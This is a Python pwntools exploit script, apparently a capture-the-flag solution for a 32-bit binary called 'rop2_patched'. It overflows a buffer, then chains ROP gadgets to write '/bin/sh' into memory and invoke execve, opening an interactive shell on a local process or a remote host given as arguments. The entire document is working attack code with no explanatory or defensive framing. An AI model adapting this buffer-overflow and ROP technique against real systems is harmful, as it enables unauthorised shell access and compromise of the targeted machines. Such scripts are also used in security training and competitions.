#!/usr/bin/env python
# Generated by ropper ropchain generator #

from pwn import *
import sys
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]

if len(sys.argv) == 1:
    r = process("./rop2_patched")
    if args.GDB:
        gdb.attach(r,'b *0x8048320')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    sys._exit(1)
padding = b"A" * 16
overflow = 0x08048454
syscall_plt = 0x8048320
r.sendafter(b'Give me your ropchain:',b'A' * 8 + b'//bin/sh' + p32(overflow) +  b'//bin/sh\x00' * 30)
res = r.recv(0x400)
sh = 0x804a040
# 0x0804843e: pop eax; pop edx; pop ecx; ret;
# 0x0804844e: pop dword ptr [eax]; ret;
pop_eax_edx_ecx = 0x0804843e
pop_dword_ptr_eax = 0x0804844e
r.sendline(b'//bin/sh' * 2 + 
        p32(pop_eax_edx_ecx) + p32(sh) + p32(0x0) + p32(0x0) +
        p32(pop_dword_ptr_eax) + b'/bin' +
        p32(pop_eax_edx_ecx) + p32(sh + 0x4) + p32(0x0) + p32(0x0) +
        p32(pop_dword_ptr_eax) + b'/sh\x00' +
        p32(syscall_plt) + p32(0xDEADBEEF) + p32(0xb) + p32(sh) + p32(0x804a018) + p32(0x804a018))
r.interactive()


